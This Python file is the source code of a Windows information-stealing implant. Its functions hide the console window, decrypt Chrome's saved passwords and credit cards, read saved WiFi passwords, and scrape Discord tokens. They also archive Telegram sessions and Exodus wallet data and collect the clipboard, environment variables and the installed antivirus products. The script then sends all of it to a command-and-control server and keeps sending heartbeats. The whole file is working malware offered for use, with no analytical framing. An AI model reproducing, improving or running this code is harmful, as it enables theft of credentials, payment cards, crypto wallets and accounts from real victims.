# ==================================================================================================
# --- IMPORTS ---
# ==================================================================================================
import os
import platform
import socket
import psutil
import subprocess
import re
import json
import base64
import sqlite3
import shutil
import uuid
import time
import requests
import threading
from datetime import datetime, timedelta

# Try to import optional modules required for advanced harvesting
try:
    import win32crypt
    from Crypto.Cipher import AES
    import pyperclip
except ImportError:
    pass # If these fail, the functions that need them will be disabled.

# ==================================================================================================
# --- CONFIGURATION ---
# ==================================================================================================
C2_URL = "http://127.0.0.1:5002" # This URL is replaced by the builder
HEARTBEAT_INTERVAL = 30 # Seconds

# ==================================================================================================
# --- HELPER FUNCTIONS ---
# ==================================================================================================
def run_command(command):
    """Executes a shell command and returns its output, hiding the console window."""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore').strip()
    except Exception:
        return "Command failed to execute."

def get_public_ip():
    """Fetches the public IP address from an external service."""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        return "N/A"

def get_chrome_datetime(chromedate):
    """Converts Chrome's timestamp format to a human-readable format."""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception:
            return chromedate
    else:
        return ""

def get_encryption_key():
    """Retrieves the AES encryption key for Chrome/Edge browsers from the 'Local State' file."""
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:] # Remove 'DPAPI' prefix
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_data(data, key):
    """Decrypts data that was encrypted with AES-256-GCM (used by Chrome/Edge)."""
    try:
        iv = data[3:15]
        payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode() # Exclude the tag
    except Exception:
        return ""

# ==================================================================================================
# --- DATA HARVESTING FUNCTIONS (REVISED) ---
# ==================================================================================================

def harvest_system_info():
    """Gathers comprehensive OS, hardware, and user information."""
    try:
        uname = platform.uname()
        os_info = f"OS: {uname.system} {uname.release} (Build {platform.win32_ver()[1]})\n"
        os_info += f"Architecture: {platform.machine()}\n"
        os_info += f"Hostname: {socket.gethostname()}\n\n"
        os_info += f"CPU: {platform.processor()}\n"
        os_info += f"GPU(s):\n{run_command(['wmic', 'path', 'win32_videocontroller', 'get', 'name'])}\n"
        ram = psutil.virtual_memory()
        os_info += f"Installed RAM: {ram.total / (1024**3):.2f} GB\n\n"
        os_info += "Disk Drives:\n"
        partitions = psutil.disk_partitions()
        for p in partitions:
            try:
                usage = psutil.disk_usage(p.mountpoint)
                os_info += f"  - {p.device} ({p.fstype}) on {p.mountpoint}: {usage.total / (1024**3):.2f} GB\n"
            except Exception: continue
        os_info += f"\nUser Accounts:\n{run_command(['net', 'user'])}\n"
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        os_info += f"System Uptime: {uptime}\n"
        return os_info
    except Exception as e: return f"Could not retrieve system info: {e}"

def harvest_processes_and_apps():
    """REVISED: Lists running processes and installed applications without sub-headers."""
    try:
        processes = f"Running Processes:\n{'-'*20}\n{run_command(['tasklist'])}\n\n"
        apps = f"Installed Applications:\n{'-'*25}\n{run_command(['wmic', 'product', 'get', 'name,version'])}"
        return processes + apps
    except Exception as e: return f"Could not retrieve processes or applications: {e}"

def harvest_security_products():
    """Identifies installed Antivirus and Firewall products using WMI."""
    try:
        av = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'])
        fw = run_command(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'FirewallProduct', 'get', 'displayName'])
        return f"Antivirus:\n{av if 'DisplayName' in av else 'Not Found'}\n\nFirewall:\n{fw if 'DisplayName' in fw else 'Not Found'}"
    except Exception as e: return f"Could not query security products: {e}"

def harvest_environment_variables():
    """Dumps all environment variables."""
    try:
        return json.dumps(dict(os.environ), indent=4)
    except Exception as e: return f"Could not retrieve environment variables: {e}"

def harvest_network_info():
    """REVISED: Gathers detailed network information without sub-headers."""
    try:
        info = f"Public IP: {get_public_ip()}\n"
        info += f"Private IP: {socket.gethostbyname(socket.gethostname())}\n"
        info += f"MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n\n"
        info += f"ARP Table (Local Network Devices):\n{'-'*35}\n{run_command(['arp', '-a'])}\n\n"
        info += f"Active Connections:\n{'-'*20}\n{run_command(['netstat', '-an'])}\n\n"
        info += f"Saved WiFi Profiles & Passwords:\n{'-'*35}\n"
        profiles = run_command(['netsh', 'wlan', 'show', 'profiles'])
        profile_names = re.findall(r"All User Profile\s*:\s(.*)", profiles)
        wifi_found = False
        for name in profile_names:
            wifi_found = True
            name = name.strip()
            profile_info = run_command(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'])
            password = re.search(r"Key Content\s*:\s(.*)", profile_info)
            info += f"Profile: {name}\nPassword: {password.group(1).strip() if password else 'N/A'}\n\n"
        if not wifi_found: info += "No WiFi profiles found.\n\n"
        info += f"DNS Cache:\n{'-'*10}\n{run_command(['ipconfig', '/displaydns'])}"
        return info
    except Exception as e: return f"Could not retrieve network info: {e}"

def harvest_browser_credentials():
    """REVISED: Steals passwords and credit cards without sub-headers."""
    try:
        key = get_encryption_key()
        if not key: return "Could not get browser encryption key. Is Chrome installed?"
        output = ""
        # Passwords
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        temp_db = os.path.join(os.environ["TEMP"], "login_temp.db")
        if os.path.exists(db_path):
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            output += f"Browser Passwords (Chrome):\n{'-'*28}\n"
            pass_found = False
            for row in cursor.fetchall():
                password = decrypt_data(row[3], key)
                if password:
                    pass_found = True
                    output += f"URL: {row[0]}\nUsername: {row[2]}\nPassword: {password}\n\n"
            if not pass_found: output += "No passwords found in database.\n\n"
            conn.close()
            os.remove(temp_db)
        # Credit Cards
        db_path_cc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
        temp_db_cc = os.path.join(os.environ["TEMP"], "web_temp.db")
        if os.path.exists(db_path_cc):
            shutil.copy2(db_path_cc, temp_db_cc)
            conn = sqlite3.connect(temp_db_cc)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            output += f"\nBrowser Credit Cards (Chrome):\n{'-'*30}\n"
            cc_found = False
            for row in cursor.fetchall():
                cc_number = decrypt_data(row[3], key)
                if cc_number:
                    cc_found = True
                    output += f"Name: {row[0]}\nExpires: {row[1]}/{row[2]}\nNumber: {cc_number}\n\n"
            if not cc_found: output += "No credit cards found in database.\n\n"
            conn.close()
            os.remove(temp_db_cc)
        return output if output else "No browser credentials found."
    except Exception as e: return f"Failed to harvest browser credentials: {e}"

def harvest_discord_tokens():
    """REVISED: Scans for Discord auth tokens and returns only the content."""
    try:
        output = ""
        token_paths = {
            'Discord': os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb"),
            'Discord Canary': os.path.join(os.environ["APPDATA"], "discordcanary", "Local Storage", "leveldb"),
        }
        found_tokens = []
        for name, path in token_paths.items():
            if not os.path.exists(path): continue
            for file_name in os.listdir(path):
                if not file_name.endswith((".log", ".ldb")): continue
                for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}", line):
                        if token not in found_tokens:
                            output += f"Found in {name}: {token}\n"
                            found_tokens.append(token)
        return output if found_tokens else "No Discord tokens found."
    except Exception as e: return f"Failed during Discord token harvesting: {e}"

def zip_and_harvest(target_path, zip_name):
    """Helper to zip a directory and return the path to the zip file."""
    try:
        if os.path.exists(target_path):
            temp_dir = os.environ.get("TEMP", "/tmp") # Make it Linux-compatible for safety
            zip_file_path = os.path.join(temp_dir, zip_name)
            shutil.make_archive(zip_file_path, 'zip', target_path)
            return f"{zip_name}.zip created in TEMP directory."
        return f"{zip_name} data not found."
    except Exception as e: return f"Could not zip {zip_name}: {e}"

def harvest_misc_credentials():
    """REVISED: Harvests data from other apps without sub-headers."""
    try:
        output = f"Telegram Desktop Session:\n{'-'*26}\n"
        output += zip_and_harvest(os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata"), "Telegram") + "\n\n"
        output += f"Cryptocurrency Wallets:\n{'-'*24}\n"
        wallets = {"Exodus": os.path.join(os.environ["APPDATA"], "Exodus")}
        for name, path in wallets.items():
             output += f"{name}: {zip_and_harvest(path, name)}\n"
        output += f"\nSSH Keys:\n{'-'*10}\n"
        ssh_path = os.path.join(os.environ["USERPROFILE"], ".ssh")
        if os.path.exists(ssh_path):
            output += "SSH directory found. Contents:\n"
            for file in os.listdir(ssh_path):
                output += f"  - {file}\n"
        else:
            output += "No SSH directory found.\n"
        return output
    except Exception as e: return f"Failed during misc credential harvesting: {e}"

def get_clipboard_content():
    """Retrieves the current content of the clipboard."""
    try:
        return pyperclip.paste()
    except Exception as e: return f"Could not get clipboard data: {e}"

# ==================================================================================================
# --- MAIN PAYLOAD LOGIC ---
# ==================================================================================================
def harvest_all_data():
    """
    Main orchestrator function. It calls all individual harvesting functions
    and formats their output into a single string with clean main headers.
    """
    data_sections = {
        "System Info": harvest_system_info,
        "Processes & Applications": harvest_processes_and_apps,
        "Security Products": harvest_security_products,
        "Network Info": harvest_network_info,
        "Browser Credentials": harvest_browser_credentials,
        "Discord Tokens": harvest_discord_tokens,
        "Misc Credentials & Wallets": harvest_misc_credentials,
        "Clipboard": get_clipboard_content,
        "Environment Variables": harvest_environment_variables
    }
    final_report = ""
    for title, func in data_sections.items():
        final_report += f"--- {title} ---\n\n"
        try:
            final_report += func() + "\n\n"
        except Exception as e:
            final_report += f"Error during harvesting: {e}\n\n"
    return final_report.strip()

def send_to_c2(endpoint, data):
    """Sends data to the specified C2 endpoint."""
    try:
        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=15)
        return True
    except requests.RequestException:
        return False

def maintain_presence(session_id):
    """Continuously sends heartbeats to the C2 server in a background thread."""
    while True:
        send_to_c2("/api/heartbeat", {"session_id": session_id})
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    session_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    harvested_data = harvest_all_data()
    registration_data = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
    if send_to_c2("/api/register", registration_data):
        threading.Thread(target=maintain_presence, args=(session_id,), daemon=True).start()
        while True: time.sleep(60)